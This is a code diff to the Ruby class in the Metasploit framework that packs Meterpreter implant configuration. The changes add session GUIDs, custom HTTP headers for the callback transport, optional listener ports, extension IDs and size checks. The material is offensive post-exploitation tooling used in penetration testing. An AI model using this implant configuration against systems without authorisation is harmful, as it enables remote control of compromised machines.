@@ -1,9 +1,8 @@
 # -*- coding: binary -*-
-require 'msf/core/payload/uuid'
-require 'msf/core/payload/windows'
-require 'msf/core/reflective_dll_loader'
 require 'rex/socket/x509_certificate'
-
+require 'rex/post/meterpreter/extension_mapper'
+require 'securerandom'
+require 'rex/payloads/meterpreter'
 class Rex::Payloads::Meterpreter::Config
 
   include Msf::ReflectiveDLLLoader
@@ -35,6 +34,9 @@ private
   end
 
   def to_str(item, size)
+    if item.size >= size  # ">=" instead of only ">", because we need space for a terminating null byte (for string handling in C)
+      raise Msf::PayloadItemSizeError.new(item, size - 1)
+    end
     @to_str.call(item, size)
   end
 
@@ -50,14 +52,23 @@ private
     uuid = opts[:uuid].to_raw
     exit_func = Msf::Payload::Windows.exit_types[opts[:exitfunk]]
 
+    # if no session guid is given then we'll just pass the blank
+    # guid through. this is important for stageless payloads
+    if opts[:stageless] == true || opts[:null_session_guid] == true
+      session_guid = "\x00" * 16
+    else
+      session_guid = [SecureRandom.uuid.gsub(/-/, '')].pack('H*')
+    end
+
     session_data = [
       0,                  # comms socket, patched in by the stager
       exit_func,          # exit function identifer
       opts[:expiration],  # Session expiry
-      uuid                # the UUID
+      uuid,               # the UUID
+      session_guid        # the Session GUID
     ]
 
-    session_data.pack('VVVA*')
+    session_data.pack('QVVA*A*')
   end
 
   def transport_block(opts)
@@ -68,7 +79,8 @@ private
       lhost = "[#{lhost}]"
     end
 
-    url = "#{opts[:scheme]}://#{lhost}:#{opts[:lport]}"
+    url = "#{opts[:scheme]}://#{lhost}"
+    url << ":#{opts[:lport]}" if opts[:lport]
     url << "#{opts[:uri]}/" if opts[:uri]
     url << "?#{opts[:scope_id]}" if opts[:scope_id]
 
@@ -86,7 +98,7 @@ private
       proxy_host = ''
       if opts[:proxy_host] && opts[:proxy_port]
         prefix = 'http://'
-        prefix = 'socks=' if opts[:proxy_type].downcase == 'socks'
+        prefix = 'socks=' if opts[:proxy_type].to_s.downcase == 'socks'
         proxy_host = "#{prefix}#{opts[:proxy_host]}:#{opts[:proxy_port]}"
       end
       proxy_host = to_str(proxy_host || '', PROXY_HOST_SIZE)
@@ -97,15 +109,19 @@ private
       cert_hash = "\x00" * CERT_HASH_SIZE
       cert_hash = opts[:ssl_cert_hash] if opts[:ssl_cert_hash]
 
+      custom_headers = opts[:custom_headers] || ''
+      custom_headers = to_str(custom_headers, custom_headers.length + 1)
+
       # add the HTTP specific stuff
-      transport_data << proxy_host  # Proxy host name
-      transport_data << proxy_user  # Proxy user name
-      transport_data << proxy_pass  # Proxy password
-      transport_data << ua          # HTTP user agent
-      transport_data << cert_hash   # SSL cert hash for verification
+      transport_data << proxy_host      # Proxy host name
+      transport_data << proxy_user      # Proxy user name
+      transport_data << proxy_pass      # Proxy password
+      transport_data << ua              # HTTP user agent
+      transport_data << cert_hash       # SSL cert hash for verification
+      transport_data << custom_headers  # any custom headers that the client needs
 
       # update the packing spec
-      pack << 'A*A*A*A*A*'
+      pack << 'A*A*A*A*A*A*'
     end
 
     # return the packed transport information
@@ -114,24 +130,25 @@ private
 
   def extension_block(ext_name, file_extension)
     ext_name = ext_name.strip.downcase
-    ext, o = load_rdi_dll(MetasploitPayloads.meterpreter_path("ext_server_#{ext_name}",
+    ext, _ = load_rdi_dll(MetasploitPayloads.meterpreter_path("ext_server_#{ext_name}",
                                                               file_extension))
 
-    extension_data = [ ext.length, ext ].pack('VA*')
+    [ ext.length, ext ].pack('VA*')
   end
 
   def extension_init_block(name, value)
+    ext_id = Rex::Post::Meterpreter::ExtensionMapper.get_extension_id(name)
+
     # for now, we're going to blindly assume that the value is a path to a file
     # which contains the data that gets passed to the extension
-    content = ::File.read(value)
+    content = ::File.read(value) + "\x00\x00"
     data = [
-      name,
-      "\x00",
+      ext_id,
       content.length,
       content
     ]
 
-    data.pack('A*A*VA*')
+    data.pack('VVA*')
   end
 
   def config_block
@@ -164,8 +181,8 @@ private
       config << extension_init_block(name, value)
     end
 
-    # terminate the ext init config with a final null byte
-    config << "\x00"
+    # terminate the ext init config with -1
+    config << "\xFF\xFF\xFF\xFF"
 
     # and we're done
     config
